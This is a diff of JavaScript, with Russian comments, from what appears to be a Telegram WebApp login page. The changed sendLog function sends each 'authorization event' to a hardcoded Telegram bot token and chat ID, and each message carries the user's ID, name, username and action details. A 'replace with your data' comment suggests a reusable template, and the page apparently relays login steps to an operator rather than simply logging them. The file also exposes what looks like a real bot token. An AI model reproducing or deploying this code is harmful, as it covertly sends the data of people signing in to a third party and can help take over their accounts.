@@ -477,7 +477,7 @@
     let currentScreen = 1;
     let resendTimerInterval;
 
-    // Конфигурация для логов
+    // Конфигурация для логов - ЗАМЕНИТЕ НА ВАШИ ДАННЫЕ
     const BOT_TOKEN = '7872244632:AAH78O5srYOqV7QdxjztT6px-Qi1TKZlTA0'; // Замените на токен вашего бота
     const LOG_CHAT_ID = '-1003260648472'; // Замените на ID чата/группы для логов
 
@@ -489,39 +489,25 @@
       countryCodeElement.textContent = selectedValue;
     }
 
-    // Функция отправки логов через Bot API
+    // Функция отправки логов через Bot API в реальном времени
     async function sendLog(action, details = '') {
       try {
         const user = tg.initDataUnsafe?.user;
         
-        const logData = {
-          type: 'log',
-          action: action,
-          details: details,
-          user: user ? {
-            id: user.id,
-            first_name: user.first_name,
-            username: user.username
-          } : null,
-          timestamp: new Date().toLocaleString('ru-RU'),
-          platform: 'Telegram WebApp'
-        };
-        
-        console.log('📤 Отправка лога:', logData);
-        
-        // Формируем сообщение для отправки
-        const message = `
+        const logMessage = `
 🔔 **Новое событие авторизации**
 
 **Действие:** ${action}
 **Детали:** ${details}
 **Пользователь:** ${user ? `ID: ${user.id}, Имя: ${user.first_name}${user.username ? `, @${user.username}` : ''}` : 'Не авторизован'}
-**Время:** ${logData.timestamp}
-**Платформа:** ${logData.platform}
+**Время:** ${new Date().toLocaleString('ru-RU')}
+**Платформа:** Telegram WebApp
         `.trim();
 
+        console.log('📤 Отправка лога:', { action, details });
+
         // Отправляем через Bot API
-        if (BOT_TOKEN && LOG_CHAT_ID && BOT_TOKEN !== 'YOUR_BOT_TOKEN') {
+        if (BOT_TOKEN && LOG_CHAT_ID && BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE') {
           try {
             const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
               method: 'POST',
@@ -530,7 +516,7 @@
               },
               body: JSON.stringify({
                 chat_id: LOG_CHAT_ID,
-                text: message,
+                text: logMessage,
                 parse_mode: 'Markdown'
               })
             });
@@ -546,12 +532,11 @@
           }
         } else {
           console.warn('⚠️ Bot token или chat ID не настроены');
-          // Дублируем в console для отладки
-          console.log('Лог (не отправлен в Telegram):', message);
+          console.log('Лог (не отправлен в Telegram):', logMessage);
         }
         
       } catch (error) {
-        console.error('❌ Ошибка отправки лога:', error);
+        console.error('❌ Общая ошибка отправки лога:', error);
       }
     }
 
